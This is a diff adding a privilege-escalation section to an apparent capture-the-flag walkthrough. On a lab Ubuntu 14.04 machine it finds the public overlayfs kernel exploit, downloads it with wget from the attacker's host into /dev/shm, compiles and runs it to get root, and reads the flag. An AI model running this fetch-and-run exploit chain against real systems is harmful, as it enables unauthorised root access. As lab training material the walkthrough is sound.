@@ -205,12 +205,79 @@ uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
 $ 
 ```
 
+## 4.Privilege Escalation Method 1
+
+We just check the kernel version and os release version :
+
+```bash
+$ uname -a
+Linux troll 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux
+
+$ cat /etc/os-release
+NAME="Ubuntu"
+VERSION="14.04.1 LTS, Trusty Tahr"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 14.04.1 LTS"
+VERSION_ID="14.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+```
+
+if we check the `searchsploit` for any public exploit for this version we see :
+
+```bash
+root@kali: searchsploit linux 3.13
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                           | linux/local/37292.c
+```
+
+this exploit matches with victim kernel version just upload it on the victim and compile and execute it :
+
+```bash
+$ cd /dev/shm
+$ wget http://192.168.127.128/37292.c
+--2023-09-17 04:39:38--  http://192.168.127.128/37292.c
+Connecting to 192.168.127.128:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4968 (4.9K) [text/x-csrc]
+Saving to: ‘37292.c’
+
+100%[=======================================================================================================================>] 4,968       --.-K/s   in 0.001s  
+
+2023-09-17 04:39:38 (7.24 MB/s) - ‘37292.c’ saved [4968/4968]
+
+$ ls
+37292.c
+
+$ gcc 37292.c
+
+$ ls
+37292.c  a.out
+
+$ ./a.out
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+
+# id
+uid=0(root) gid=0(root) groups=0(root),1002(overflow)
+
+# cd /root
+
+# cat proof.txt
+Good job, you did it! 
 
 
+702a8c18d29c6f3ca0d99ef5712bfbdc
+```
 
+this is one method to get the flag.
 
-
-
+## 5.Privilege Escalation Method 2
 
 
 
